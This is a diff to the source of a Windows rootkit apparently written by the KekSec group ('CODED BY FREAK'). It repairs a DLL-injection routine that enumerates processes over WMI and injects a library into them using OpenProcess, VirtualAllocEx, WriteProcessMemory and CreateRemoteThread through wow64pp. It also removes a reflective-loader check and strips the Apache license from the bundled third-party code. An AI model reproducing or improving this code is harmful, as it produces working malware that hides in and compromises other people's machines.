@@ -1,5 +1,6 @@
 //dont skid this leave credit - CODED BY FREAK - http://pastebin.com/u/KekSec - https://github.com/freakanonymous
 //please star me on github :D
+//copyright??? - Freak 01/25/2021
 #pragma once
 #ifndef NO_ROOTKIT
 #ifndef __RKIT_LOADED
@@ -17,9 +18,6 @@ using namespace std;
 #include <stdio.h>
 #include <psapi.h>
 #include <fstream>
-#pragma comment(lib, "ntdll.lib") //for RtlAdjustPrivilege in heavens gate 
-#define SE_DEBUG_PRIVILEGE 20
-extern "C" NTSYSAPI NTSTATUS WINAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
 char* dllhide = "$6829";
 char* mutexseparator = ":";
 bool IsInjected(DWORD pid)
@@ -33,27 +31,13 @@ bool IsInjected(DWORD pid)
 
     return 1;
 }
-/*
- * Copyright 2017 - 2018 Justas Masiulis
- *
- * Licensed under the Apache License, Version 2.0 (the "License");
- * you may not use this file except in compliance with the License.
- * You may obtain a copy of the License at
- *
- *     http://www.apache.org/licenses/LICENSE-2.0
- *
- * Unless required by applicable law or agreed to in writing, software
- * distributed under the License is distributed on an "AS IS" BASIS,
- * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
- * See the License for the specific language governing permissions and
- * limitations under the License.
- */
 
 #ifndef WOW64PP_HPP
 #define WOW64PP_HPP
 
 #include <system_error>
 #include <memory>
+#include <limits>
 #include <cstring> // memcpy
 
 namespace wow64pp {
@@ -383,12 +367,11 @@ namespace wow64pp {
             return pbi.PebBaseAddress;
         }
 
-
-        template<typename P>
+        template<typename PP>
         inline void
-            read_memory(std::uint64_t address, P* buffer, std::size_t size = sizeof(P))
+            read_memory(std::uint64_t address, PP* buffer, std::size_t size = sizeof(PP))
         {
-            if (address < std::numeric_limits<std::uint32_t>::max()) {
+            if (address < 0xFFFFFFFF) {
                 std::memcpy(buffer,
                     reinterpret_cast<const void*>(
                         static_cast<std::uint32_t>(address)),
@@ -400,20 +383,20 @@ namespace wow64pp {
                 native_ntdll_function<defs::NtWow64ReadVirtualMemory64T>(
                     "NtWow64ReadVirtualMemory64");
 
-            HANDLE h_self = self_handle();
+            HANDLE h_self = (HANDLE)self_handle();
             auto   hres =
                 NtWow64ReadVirtualMemory64(h_self, address, buffer, size, nullptr);
             CloseHandle(h_self);
             throw_if_failed("NtWow64ReadVirtualMemory64() failed", hres);
         }
 
-        template<typename P>
+        template<typename PP>
         inline void read_memory(std::uint64_t    address,
-            P* buffer,
+            PP* buffer,
             std::size_t      size,
             std::error_code& ec) noexcept
         {
-            if (address < std::numeric_limits<std::uint32_t>::max()) {
+            if (address < 0xFFFFFFFF) {
                 std::memcpy(buffer,
                     reinterpret_cast<const void*>(
                         static_cast<std::uint32_t>(address)),
@@ -1027,22 +1010,16 @@ int WMITask::WMIGetUserProcesses(char * dllpath, DWORD mypid, BOOL isrunning64)
                     if (ec) return -2;
                     auto OpenProcess64 = wow64pp::import(kernel32, "OpenProcess", ec);
                     if (ec) return -3;
-                    std::error_code ec;
                     LPVOID LoadLibAddr = (LPVOID)wow64pp::import(kernel32, "LoadLibraryA", ec);
                     if (ec) return -4;
-                    std::error_code ec;
-                    auto VirtualAllocEx64 = wow64pp::import(kernel32, "VirtualAllocEx64", ec);
+                    auto VirtualAllocEx64 = wow64pp::import(kernel32, "VirtualAllocEx", ec);
                     if (ec) return -5;
-                    std::error_code ec;
                     auto WriteProcessMemory64 = wow64pp::import(kernel32, "WriteProcessMemory", ec);
                     if (ec) return -6;
-                    std::error_code ec;
                     auto CreateRemoteThread64 = wow64pp::import(kernel32, "CreateRemoteThread", ec);
                     if (ec) return -7;
-                    std:error_code ec;
                     auto WaitForSingleObject64 = wow64pp::import(kernel32, "WaitForSingleObject", ec);
                     if (ec) return -8;
-                    std:error_code ec;
                     auto VirtualFreeEx64 = wow64pp::import(kernel32, "VirtualFreeEx", ec);
                     if (ec) return -9;
                     h = (HANDLE)wow64pp::call_function(OpenProcess64, PROCESS_ALL_ACCESS, false, ProcessId.uintVal);
@@ -1184,11 +1161,6 @@ DWORD WINAPI rootkit(LPARAM none) {
 	}
 	// check if the library has a ReflectiveLoader...
 	char *lpBuff = getFileContent(dllinstallpath);
-	DWORD dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpBuff);
-	if (!dwReflectiveLoaderOffset)
-	{
-		return -4123;
-	}
 
     DWORD mypid = GetCurrentProcessId();
 	while (1) {
